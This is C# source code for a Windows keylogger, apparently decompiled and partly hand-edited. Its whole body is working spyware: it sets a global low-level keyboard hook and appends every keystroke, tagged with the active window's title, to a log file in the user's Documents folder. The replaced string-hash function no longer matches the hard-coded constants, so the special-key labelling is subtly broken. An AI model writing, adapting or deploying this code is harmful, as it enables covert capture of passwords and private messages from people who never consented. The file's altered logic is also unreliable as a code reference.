using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Keylogger
{
	// Token: 0x02000002 RID: 2
	public static class Keylogger
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static void Main()
		{
			Keylogger._hookID = Keylogger.SetHook(Keylogger._proc);
			Application.Run();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002068 File Offset: 0x00000268
		private static IntPtr SetHook(Keylogger.LowLevelKeyboardProc proc)
		{
			IntPtr result;
			using (Process currentProcess = Process.GetCurrentProcess())
			{
				result = Keylogger.SetWindowsHookEx(Keylogger.WHKEYBOARDLL, proc, Keylogger.GetModuleHandle(currentProcess.ProcessName), 0U);
			}
			return result;
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020B0 File Offset: 0x000002B0
		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && wParam == (IntPtr)256)
			{
				int num = Marshal.ReadInt32(lParam);
				bool flag = ((int)Keylogger.GetKeyState(20) & 65535) != 0;
				bool flag2 = ((int)Keylogger.GetKeyState(160) & 32768) != 0 || ((int)Keylogger.GetKeyState(161) & 32768) != 0;
				string text = Keylogger.KeyboardLayout((uint)num);
				if (flag || flag2)
				{
					text = text.ToUpper();
				}
				else
				{
					text = text.ToLower();
				}
				if (num >= 112 && num <= 135)
				{
					string str = "[";
					Keys keys = (Keys)num;
					text = str + keys.ToString() + "]";
				}
				else
				{
					Keys keys = (Keys)num;
					string text2 = keys.ToString();
					if (text2 != null)
					{
						//uint num2 = <PrivateImplementationDetails>.ComputeStringHash(text2);
						uint num2 = ComputeStringHash(text2);
                        if (num2 <= 3250860581U)
						{
							if (num2 <= 497839467U)
							{
								if (num2 != 298493515U)
								{
									if (num2 == 497839467U)
									{
										if (text2 == "LControlKey")
										{
											text = "[CTRL]";
										}
									}
								}
								else if (text2 == "Capital")
								{
									if (flag)
									{
										text = "[CAPSLOCK: OFF]";
									}
									else
									{
										text = "[CAPSLOCK: ON]";
									}
								}
							}
							else if (num2 != 547024555U)
							{
								if (num2 != 3082514982U)
								{
									if (num2 == 3250860581U)
									{
										if (text2 == "Space")
										{
											text = "[SPACE]";
										}
									}
								}
								else if (text2 == "Escape")
								{
									text = "[ESC]";
								}
							}
							else if (text2 == "LWin")
							{
								text = "[WIN]";
							}
						}
						else if (num2 <= 3822460366U)
						{
							if (num2 != 3264564162U)
							{
								if (num2 != 3422663135U)
								{
									if (num2 == 3822460366U)
									{
										if (text2 == "RShiftKey")
										{
											text = "[Shift]";
										}
									}
								}
								else if (text2 == "Return")
								{
									text = "[ENTER]";
								}
							}
							else if (text2 == "Back")
							{
								text = "[Back]";
							}
						}
						else if (num2 != 3954224277U)
						{
							if (num2 != 4117013200U)
							{
								if (num2 == 4219689196U)
								{
									if (text2 == "Tab")
									{
										text = "[Tab]";
									}
								}
							}
							else if (text2 == "LShiftKey")
							{
								text = "[Shift]";
							}
						}
						else if (text2 == "RControlKey")
						{
							text = "[CTRL]";
						}
					}
				}
				using (StreamWriter streamWriter = new StreamWriter(Keylogger.loggerPath, true))
				{
					if (Keylogger.CurrentActiveWindowTitle == Keylogger.GetActiveWindowTitle())
					{
						streamWriter.Write(text);
					}
					else
					{
						streamWriter.WriteLine(Environment.NewLine);
						streamWriter.WriteLine("###  " + Keylogger.GetActiveWindowTitle() + " ###");
						streamWriter.Write(text);
					}
				}
			}
			return Keylogger.CallNextHookEx(Keylogger._hookID, nCode, wParam, lParam);
		}

        private static uint ComputeStringHash(string input)
        {
            using (SHA256 sha256Hash = SHA256.Create())
            {
                byte[] data = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
                // Take the first 4 bytes of the hash and convert them to an uint
                return BitConverter.ToUInt32(data, 0);
            }
        }

        // Token: 0x06000004 RID: 4 RVA: 0x000023F4 File Offset: 0x000005F4
        private static string KeyboardLayout(uint vkCode)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				byte[] lpKeyState = new byte[256];
				if (!Keylogger.GetKeyboardState(lpKeyState))
				{
					return "";
				}
				uint wScanCode = Keylogger.MapVirtualKey(vkCode, 0U);
				uint num;
				IntPtr keyboardLayout = Keylogger.GetKeyboardLayout(Keylogger.GetWindowThreadProcessId(Keylogger.GetForegroundWindow(), out num));
				Keylogger.ToUnicodeEx(vkCode, wScanCode, lpKeyState, stringBuilder, 5, 0U, keyboardLayout);
				return stringBuilder.ToString();
			}
			catch
			{
			}
			Keys keys = (Keys)vkCode;
			return keys.ToString();
		}

		// Token: 0x06000005 RID: 5 RVA: 0x0000247C File Offset: 0x0000067C
		private static string GetActiveWindowTitle()
		{
			string result;
			try
			{
				uint processId;
				Keylogger.GetWindowThreadProcessId(Keylogger.GetForegroundWindow(), out processId);
				Process processById = Process.GetProcessById((int)processId);
				string text = processById.MainWindowTitle;
				if (string.IsNullOrWhiteSpace(text))
				{
					text = processById.ProcessName;
				}
				Keylogger.CurrentActiveWindowTitle = text;
				result = text;
			}
			catch (Exception)
			{
				result = "???";
			}
			return result;
		}

		// Token: 0x06000006 RID: 6
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook, Keylogger.LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

		// Token: 0x06000007 RID: 7
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		// Token: 0x06000008 RID: 8
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000009 RID: 9
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x0600000A RID: 10
		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		// Token: 0x0600000B RID: 11
		[DllImport("user32.dll", SetLastError = true)]
		private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		// Token: 0x0600000C RID: 12
		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		public static extern short GetKeyState(int keyCode);

		// Token: 0x0600000D RID: 13
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool GetKeyboardState(byte[] lpKeyState);

		// Token: 0x0600000E RID: 14
		[DllImport("user32.dll")]
		private static extern IntPtr GetKeyboardLayout(uint idThread);

		// Token: 0x0600000F RID: 15
		[DllImport("user32.dll")]
		private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

		// Token: 0x06000010 RID: 16
		[DllImport("user32.dll")]
		private static extern uint MapVirtualKey(uint uCode, uint uMapType);

		// Token: 0x04000001 RID: 1
		private static readonly string loggerPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\log.txt";

		// Token: 0x04000002 RID: 2
		private static string CurrentActiveWindowTitle;

		// Token: 0x04000003 RID: 3
		private const int WM_KEYDOWN = 256;

		// Token: 0x04000004 RID: 4
		private static Keylogger.LowLevelKeyboardProc _proc = new Keylogger.LowLevelKeyboardProc(Keylogger.HookCallback);

		// Token: 0x04000005 RID: 5
		private static IntPtr _hookID = IntPtr.Zero;

		// Token: 0x04000006 RID: 6
		private static int WHKEYBOARDLL = 13;

		// Token: 0x02000006 RID: 6
		// (Invoke) Token: 0x0600001B RID: 27
		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
	}
}
